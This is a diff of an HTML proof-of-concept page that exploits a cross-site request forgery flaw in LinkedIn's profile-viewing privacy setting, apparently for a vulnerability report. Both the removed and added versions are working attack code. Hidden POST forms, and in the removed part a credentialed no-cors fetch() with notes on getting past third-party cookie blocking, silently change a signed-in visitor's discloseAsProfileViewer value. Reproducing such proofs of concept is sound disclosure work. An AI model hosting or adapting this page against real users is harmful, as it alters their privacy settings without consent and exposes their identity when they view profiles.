@@ -2,67 +2,32 @@
 <meta charset="utf-8">
 <title>F101 PoC</title>
 <style>
- body{font:15px/1.6 system-ui,sans-serif;max-width:580px;margin:45px auto;padding:0 20px}
- button{font:inherit;padding:12px 18px;margin:6px 8px 6px 0;border:1px solid #0a66c2;
+ body{font:15px/1.7 system-ui,sans-serif;max-width:520px;margin:60px auto;padding:0 20px}
+ button{font:inherit;padding:12px 20px;margin:5px 8px 5px 0;border:1px solid #0a66c2;
         border-radius:6px;background:#fff;color:#0a66c2;cursor:pointer}
  button:hover{background:#eef5fc}
- .step{margin:22px 0}
- .n{display:inline-block;width:22px;height:22px;line-height:22px;text-align:center;
-    background:#0a66c2;color:#fff;border-radius:50%;font-size:12px;margin-right:8px}
- #s{margin-top:12px;padding:10px 12px;background:#111;color:#0f0;border-radius:6px;
-    font:12px/1.5 ui-monospace,Menlo,monospace;white-space:pre-wrap}
- a{color:#0a66c2} code{background:#f0f0f0;padding:1px 5px;border-radius:3px}
+ form{display:inline}
+ a{color:#0a66c2}
+ p{color:#555}
 </style>
 
 <h2>F101 &mdash; CSRF on /psettings/profile-visibility</h2>
+<p>Be signed in to LinkedIn, then click. Works in any browser.</p>
 
-<div class="step">
-  <span class="n">1</span><b>Check the current value first.</b><br>
-  <a href="https://www.linkedin.com/mysettings-api/settingsApiSettingCards/profileViewingOptions" target="_blank">open settingsApiSettingCards/profileViewingOptions</a><br>
-  Search the page for <code>discloseAsProfileViewer</code> and note its <code>value</code>.
-</div>
+<form method="POST" action="https://www.linkedin.com/psettings/profile-visibility">
+  <input type="hidden" name="discloseAsProfileViewer" value="DISCLOSE_FULL">
+  <button>DISCLOSE_FULL</button>
+</form>
 
-<div class="step">
-  <span class="n">2</span><b>Click a value that is DIFFERENT from the current one.</b><br>
-  Sending the value it already has returns 202 and changes nothing, which looks like the bug failing.
-  <div>
-    <button onclick="go('DISCLOSE_FULL')">DISCLOSE_FULL</button>
-    <button onclick="go('DISCLOSE_ANONYMOUS')">DISCLOSE_ANONYMOUS</button>
-    <button onclick="go('HIDE')">HIDE</button>
-  </div>
-  <div id="s">ready</div>
-</div>
+<form method="POST" action="https://www.linkedin.com/psettings/profile-visibility">
+  <input type="hidden" name="discloseAsProfileViewer" value="DISCLOSE_ANONYMOUS">
+  <button>DISCLOSE_ANONYMOUS</button>
+</form>
 
-<div class="step">
-  <span class="n">2b</span><b>Top level variant (test this in Firefox / Safari).</b><br>
-  This submits as a normal navigation instead of a background request, so the browser treats
-  linkedin.com as first party and attaches the session cookie even when third party cookies are
-  blocked. You will land on a blank LinkedIn page; press Back, then check step 1.
-  <form method="POST" action="https://www.linkedin.com/psettings/profile-visibility" style="margin-top:8px">
-    <input type="hidden" name="discloseAsProfileViewer" value="HIDE">
-    <button>HIDE (top level)</button>
-  </form>
-  <form method="POST" action="https://www.linkedin.com/psettings/profile-visibility">
-    <input type="hidden" name="discloseAsProfileViewer" value="DISCLOSE_FULL">
-    <button>DISCLOSE_FULL (top level)</button>
-  </form>
-</div>
+<form method="POST" action="https://www.linkedin.com/psettings/profile-visibility">
+  <input type="hidden" name="discloseAsProfileViewer" value="HIDE">
+  <button>HIDE</button>
+</form>
 
-<div class="step">
-  <span class="n">3</span><b>Reload the link in step 1.</b> The value has changed. Restore by clicking the original value.
-</div>
-
-<script>
-var s=document.getElementById('s');
-function go(v){
-  s.textContent='sending '+v+' ...';
-  fetch('https://www.linkedin.com/psettings/profile-visibility',{
-    method:'POST',mode:'no-cors',credentials:'include',
-    headers:{'Content-Type':'application/x-www-form-urlencoded'},
-    body:'discloseAsProfileViewer='+v
-  }).then(function(){
-    s.textContent='SENT  discloseAsProfileViewer='+v+'\n'+new Date().toISOString()+
-      '\n\nNo csrf-token, no csrfToken field, no X-Requested-With.\nNow reload the link in step 1.';
-  }).catch(function(e){ s.textContent='FAILED: '+e.message; });
-}
-</script>
+<p>You will land on a blank LinkedIn page. Press Back, then check the value:<br>
+<a href="https://www.linkedin.com/mysettings-api/settingsApiSettingCards/profileViewingOptions" target="_blank">settingsApiSettingCards/profileViewingOptions</a></p>
